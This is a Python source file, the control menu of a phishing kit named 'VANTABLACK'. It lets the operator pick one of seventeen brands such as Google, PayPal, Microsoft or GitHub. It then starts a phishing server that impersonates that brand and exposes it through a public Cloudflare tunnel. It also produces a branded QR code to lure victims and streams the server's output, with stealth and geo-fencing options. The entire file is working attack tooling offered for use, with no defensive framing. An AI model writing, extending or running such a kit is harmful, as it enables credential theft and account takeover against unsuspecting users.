import subprocess
import time
import re
import sys
import os
import argparse
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from core.utils.i18n import i18n, t

console = Console()

AVAILABLE_TARGETS = [
    "twitter", "x", "google", "microsoft", "linkedin", "facebook", "instagram",
    "amazon", "apple", "discord", "dropbox", "github", "paypal", "reddit",
    "slack", "tiktok", "yahoo"
]

STEALTH_MODE = False
GEO_MODE = False

def check_dependencies():
    """Check if required tools are installed."""
    try:
        subprocess.run(["cloudflared", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        console.print(Panel.fit(t("cloudflared_missing"), style="bold red"))
        sys.exit(1)

def display_score():
    score = 100
    details = []
    
    if STEALTH_MODE:
        score += 50
        details.append(t("score_stealth"))
    
    if GEO_MODE:
        score += 50
        details.append(t("score_geo"))
        
    # Implicit bonuses
    score += 20 # Tunnel
    score += 10 # I18n
    
    color = "green" if score >= 200 else "yellow"
    console.print(Panel.fit(f"[bold {color}]POWER SCORE: {score}%[/bold {color}]\n" + "\n".join(details), title="System Status"))

def run_attack(target):
    check_dependencies()
    console.print(Panel.fit(t("menu_title") + f" ({target.upper()})", style="bold red"))
    
    display_score()
    
    if STEALTH_MODE:
        console.print(t("stealth_mode_active"))
    if GEO_MODE:
        console.print(t("geo_mode_active"))

    # Start Phishing Server
    console.print(t("starting_server", target=target))
    
    server_cmd = [sys.executable, "phishing_server.py", "--target", target, "--lang", i18n.lang]
    if STEALTH_MODE:
        server_cmd.append("--stealth")
    if GEO_MODE:
        server_cmd.append("--geo")
        
    server_process = subprocess.Popen(
        server_cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        universal_newlines=True
    )
    
    # Start Cloudflare Tunnel
    console.print(t("establishing_tunnel"))
    tunnel_process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:8080"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Wait for URL
    tunnel_url = None
    start_time = time.time()
    console.print(t("waiting_tunnel"))
    
    while time.time() - start_time < 20:
        line = tunnel_process.stderr.readline()
        if "trycloudflare.com" in line:
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if match:
                tunnel_url = match.group(0)
                break
    
    if tunnel_url:
        console.print(t("attack_url_found", url=tunnel_url))
        
        # Generate QR Code
        logo_path = f"core/assets/logos/{target}.png"
        qr_out = f"attack_qr_{target}.png"
        
        if os.path.exists(logo_path):
            console.print(t("generating_qr_logo", path=logo_path))
            subprocess.run([
                sys.executable, "quishing.py", 
                "--url", tunnel_url, 
                "--out", qr_out,
                "--logo", logo_path,
                "--lang", i18n.lang
            ])
            console.print(t("qr_generated", path=os.path.abspath(qr_out)))
        else:
            console.print(t("logo_not_found", path=logo_path))
            subprocess.run([
                sys.executable, "quishing.py", 
                "--url", tunnel_url, 
                "--out", qr_out,
                "--lang", i18n.lang
            ])
            
        console.print(t("stop_attack_msg"))
        
        # Keep alive and stream logs
        try:
            while True:
                # Read server output
                line = server_process.stdout.readline()
                if line:
                    print(line.strip())
                
                if server_process.poll() is not None:
                    console.print(t("server_died"))
                    break
                    
                time.sleep(0.01)
        except KeyboardInterrupt:
            console.print(t("stopping_attack"))
            server_process.terminate()
            tunnel_process.terminate()
            
    else:
        console.print(t("failed_tunnel"))
        server_process.terminate()
        tunnel_process.terminate()

def settings_menu():
    global STEALTH_MODE, GEO_MODE
    while True:
        clear_screen()
        console.print(Panel.fit(t("settings_menu"), style="bold cyan"))
        console.print(t("setting_lang"))
        console.print(t("setting_stealth"))
        console.print(t("setting_geo"))
        console.print(t("setting_back"))
        
        choice = Prompt.ask(t("enter_number"), choices=["1", "2", "3", "4"], default="4")
        
        if choice == "1":
            console.print(t("language_selection"))
            console.print(t("lang_en"))
            console.print(t("lang_fr"))
            lang_choice = Prompt.ask(t("enter_lang_choice"), choices=["1", "2"], default="1")
            if lang_choice == "1":
                i18n.set_language("en")
            else:
                i18n.set_language("fr")
        elif choice == "2":
            STEALTH_MODE = not STEALTH_MODE
            console.print(t("stealth_enabled") if STEALTH_MODE else t("stealth_disabled"))
        elif choice == "3":
            GEO_MODE = not GEO_MODE
            console.print(t("geo_enabled") if GEO_MODE else t("geo_disabled"))
        elif choice == "4":
            break

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_updates():
    clear_screen()
    console.print(Panel.fit(t("checking_updates"), style="bold blue"))
    time.sleep(1)
    console.print(t("connecting_server"))
    time.sleep(1.5)
    console.print(t("updates_not_found"))
    Prompt.ask(t("press_enter"))

def main_menu():
    while True:
        clear_screen()
        console.print(Panel.fit("VANTABLACK BY THE SENEGALESEHITCH", style="bold purple", subtitle="v2.1 - Live Operation"))
        console.print(t("menu_options"))
        console.print(t("option_attack"))
        console.print(t("option_settings"))
        console.print(t("option_updates"))
        console.print(t("option_exit"))
        
        choice = Prompt.ask(t("enter_number"), choices=["1", "2", "3", "4"], default="1")
        
        if choice == "1":
            console.print(t("select_target"))
            for i, t_name in enumerate(AVAILABLE_TARGETS, 1):
                console.print(f"{i}. {t_name.capitalize()}")
            
            target_choice = Prompt.ask(t("enter_number"), choices=[str(i) for i in range(1, len(AVAILABLE_TARGETS)+1)], default="1")
            target = AVAILABLE_TARGETS[int(target_choice)-1]
            run_attack(target)
        elif choice == "2":
            settings_menu()
        elif choice == "3":
            check_updates()
        elif choice == "4":
            sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="Target platform")
    parser.add_argument("--lang", help="Language (en/fr)", default="en")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    parser.add_argument("--geo", action="store_true", help="Enable geo-fencing")
    args = parser.parse_args()
    
    i18n.set_language(args.lang)
    STEALTH_MODE = args.stealth
    GEO_MODE = args.geo
    
    if args.target:
        run_attack(args.target)
    else:
        # Initial Language Selection if not set
        clear_screen()
        console.print(Panel.fit("VANTABLACK INITIALIZATION", style="bold blue"))
        console.print(t("language_selection"))
        console.print(t("lang_en"))
        console.print(t("lang_fr"))
        lang_choice = Prompt.ask(t("enter_lang_choice"), choices=["1", "2"], default="1")
        if lang_choice == "2":
            i18n.set_language("fr")
            
        main_menu()
